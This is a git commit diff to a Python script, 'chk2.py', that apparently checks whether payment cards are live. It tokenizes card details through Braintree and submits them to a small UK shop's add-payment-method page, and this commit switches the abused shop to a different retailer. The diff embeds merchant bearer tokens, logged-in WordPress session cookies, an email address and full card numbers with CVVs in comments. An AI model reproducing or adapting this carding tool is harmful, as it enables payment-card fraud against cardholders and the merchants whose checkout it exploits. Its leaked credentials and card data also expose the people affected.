b31ea0ee060cb2876d5736a86fa65c23459e004c
yousef12102008 <moh552vbnm@gmail.com>
2024-10-31 13:20:36 +0300

    Update chk2.py

--- chk2.py
+++ chk2.py
@@ -1,4 +1,3 @@
-#1
 def capture(string, start, end):
     start_pos, end_pos = string.find(start), string.find(
         end, string.find(start) + len(start)
@@ -66,11 +65,13 @@ def chk(card):
 
 
 
+
+
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzAyMDU2NzgsImp0aSI6IjdhOGI0NThkLWI1MzMtNDg3Yy05ZjRjLTE0ZDM5NWFhYzM5MCIsInN1YiI6IjM2NHpiN3dweWgzOTJkcXMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjM2NHpiN3dweWgzOTJkcXMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.txfrblCbfNYQEbkBtVwmujsL8929K6HafFQJktntV8k4rZTjOJZNKReBX8ZI5z9CqFpIqlVk3GghNOmle3lCdw',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzA0MTMyNTQsImp0aSI6IjFhODJmZDBlLTA4NzUtNDk2OC05YzljLTA2Y2EyMjRmNzMyYyIsInN1YiI6Inc5bnI1cHM2anluZGZ3Z24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inc5bnI1cHM2anluZGZ3Z24iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.U8wxTKixCCfmx9mJDTqb2vh7cXxLMLxzjWqWY8QrYmKenOw5kFfdW2BaZ2tf8QfG3-7NjOukxDqjH6PSc0K3Xg',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -90,7 +91,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '39ca64f6-b13f-42ef-998e-7d9be2e62a74',
+        'sessionId': 'b6da66ef-ae7c-441a-abd8-b4c924ec0a7f',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -99,7 +100,7 @@ def chk(card):
                 'number': n,
                 'expirationMonth': mm,
                 'expirationYear': yy,
-                'cvv':cvc,
+                'cvv': cvc,
             },
             'options': {
                 'validate': False,
@@ -113,56 +114,42 @@ def chk(card):
 
 # Note: json_data will not be serialized by requests
 # exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"39ca64f6-b13f-42ef-998e-7d9be2e62a74"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5332480062445335","expirationMonth":"09","expirationYear":"2028","cvv":"572"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"b6da66ef-ae7c-441a-abd8-b4c924ec0a7f"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115164475085010","expirationMonth":"03","expirationYear":"2027","cvv":"325"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
 #response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
-
 	tok = response.json()['data']['tokenizeCreditCard']['token']
-
 #2
 
 
 
 
-
-
-
-
-
-
-
-
-
-
 	cookies = {
-    '_gcl_au': '1.1.1884805934.1729976321',
-    '_ga': 'GA1.1.1428833298.1729976322',
-    'woocommerce_current_currency': 'GBP',
-    'wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db': 'lewisrae94%7C1731245266%7CF6jd0xAfeUMIW7uPS1fDBGzAOab5ISvuG0KLt4vaVJ2%7Cdf0d395623a5c280f68a5b572b9402d6edb807985e11ed1b1dba2f184d2878f2',
-    'mailchimp_user_previous_email': 'moh5527vbnm%40gmail.com',
-    'mailchimp_user_email': 'moh5527vbnm%40gmail.com',
-    'mailchimp_landing_site': 'https%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method',
-    'nitroCachedPage': '0',
+    '_ga': 'GA1.1.42703121.1724799079',
+    'eucookielaw': '1740351081636',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-10-28%2012%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method',
-    'sbjs_first_add': 'fd%3D2024-10-28%2012%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method',
+    'sbjs_current_add': 'fd%3D2024-10-30%2022%3A19%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-10-30%2022%3A19%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method',
-    '_ga_81KZY32HGV': 'GS1.1.1730119278.5.0.1730119278.60.0.0',
-    '_ga_0YYGQ7K779': 'GS1.1.1730119278.5.0.1730119317.0.0.0',
+    'wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29': 'bbxbcbb.hhxbfbb%7C1731536431%7CgwAcCsZ6HLEFZVyAqZUMciSFxZHs3vmfoovPwDJMNOu%7C04daef77553d387e4f9f844e6231db431b2975ee9d3b4eefa377fa7dbfd18fc9',
+    'wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29': '420%7C%7C1730499611%7C%7C1730496011%7C%7C6bbe3026c7d888336823d8e7fc8d5e50',
+    'tk_ai': 'jetpack%3AlRLmvWUxwkMWEwSffEEhzXXZ',
+    'wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197': '420%7Cother%7Cread%7C7a7f7b8699f05093d29231329fa431d0aca81d012aa7f802831d556a1d77cf39',
+    '_ga_EX1GV7CW1V': 'GS1.1.1730326795.11.1.1730326835.0.0.0',
+    '_ga_347410393': 'GS1.1.1730326795.14.1.1730326835.0.0.0',
+    'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
 }
 
 	headers = {
-    'authority': 'www.tea-and-coffee.com',
+    'authority': 'www.carolyngibbsquilts.co.uk',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': '_gcl_au=1.1.1884805934.1729976321; _ga=GA1.1.1428833298.1729976322; woocommerce_current_currency=GBP; wordpress_logged_in_ed6aaaf2a4c77ec940184ceefa0c74db=lewisrae94%7C1731245266%7CF6jd0xAfeUMIW7uPS1fDBGzAOab5ISvuG0KLt4vaVJ2%7Cdf0d395623a5c280f68a5b572b9402d6edb807985e11ed1b1dba2f184d2878f2; mailchimp_user_previous_email=moh5527vbnm%40gmail.com; mailchimp_user_email=moh5527vbnm%40gmail.com; mailchimp_landing_site=https%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method; nitroCachedPage=0; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-28%2012%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method; sbjs_first_add=fd%3D2024-10-28%2012%3A41%3A16%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.tea-and-coffee.com%2Faccount%2Fadd-payment-method; _ga_81KZY32HGV=GS1.1.1730119278.5.0.1730119278.60.0.0; _ga_0YYGQ7K779=GS1.1.1730119278.5.0.1730119317.0.0.0',
-    'origin': 'https://www.tea-and-coffee.com',
+    # 'cookie': '_ga=GA1.1.42703121.1724799079; eucookielaw=1740351081636; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-10-30%2022%3A19%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-10-30%2022%3A19%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29=bbxbcbb.hhxbfbb%7C1731536431%7CgwAcCsZ6HLEFZVyAqZUMciSFxZHs3vmfoovPwDJMNOu%7C04daef77553d387e4f9f844e6231db431b2975ee9d3b4eefa377fa7dbfd18fc9; wp_woocommerce_session_8f9b66474434421691b2f5f503bb4c29=420%7C%7C1730499611%7C%7C1730496011%7C%7C6bbe3026c7d888336823d8e7fc8d5e50; tk_ai=jetpack%3AlRLmvWUxwkMWEwSffEEhzXXZ; wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197=420%7Cother%7Cread%7C7a7f7b8699f05093d29231329fa431d0aca81d012aa7f802831d556a1d77cf39; _ga_EX1GV7CW1V=GS1.1.1730326795.11.1.1730326835.0.0.0; _ga_347410393=GS1.1.1730326795.14.1.1730326835.0.0.0; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+    'origin': 'https://www.carolyngibbsquilts.co.uk',
     'pragma': 'no-cache',
-    'referer': 'https://www.tea-and-coffee.com/account/add-payment-method',
+    'referer': 'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -174,21 +161,33 @@ def chk(card):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-	data = {
-    'payment_method': 'braintree_credit_card',
-    'wc-braintree-credit-card-card-type': 'master-card',
-    'wc-braintree-credit-card-3d-secure-enabled': '',
-    'wc-braintree-credit-card-3d-secure-verified': '',
-    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
-    'wc_braintree_credit_card_payment_nonce': tok,
-    'wc_braintree_device_data': '',
-    'wc-braintree-credit-card-tokenize-payment-method': 'true',
-    'woocommerce-add-payment-method-nonce': 'd89bd4dbac',
-    '_wp_http_referer': '/account/add-payment-method',
-    'woocommerce_add_payment_method': '1',
-}
+	data = [
+    ('wc_braintree_paypal_payment_nonce', ''),
+    ('wc_braintree_device_data', '{"correlation_id":"91bf3386e6ace5999dda115da1868f60"}'),
+    ('wc-braintree-paypal-context', 'shortcode'),
+    ('wc_braintree_paypal_amount', '0.00'),
+    ('wc_braintree_paypal_currency', 'GBP'),
+    ('wc_braintree_paypal_locale', 'en_gb'),
+    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+    ('payment_method', 'braintree_credit_card'),
+    ('wc-braintree-credit-card-card-type', 'master-card'),
+    ('wc-braintree-credit-card-3d-secure-enabled', ''),
+    ('wc-braintree-credit-card-3d-secure-verified', ''),
+    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
+    ('wc_braintree_credit_card_payment_nonce', tok,),
+    ('wc_braintree_device_data', '{"correlation_id":"91bf3386e6ace5999dda115da1868f60"}'),
+    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
+    ('woocommerce-add-payment-method-nonce', '239dce6a56'),
+    ('_wp_http_referer', '/my-account/add-payment-method/'),
+    ('woocommerce_add_payment_method', '1'),
+]
 
-	response = requests.post('https://www.tea-and-coffee.com/account/add-payment-method', cookies=cookies, headers=headers, data=data)
+	response = requests.post(
+    'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
+    cookies=cookies,
+    headers=headers,
+    data=data,
+)
     
 	text = response.text
 	pattern = r'Status code (.*?)\s*</li>'
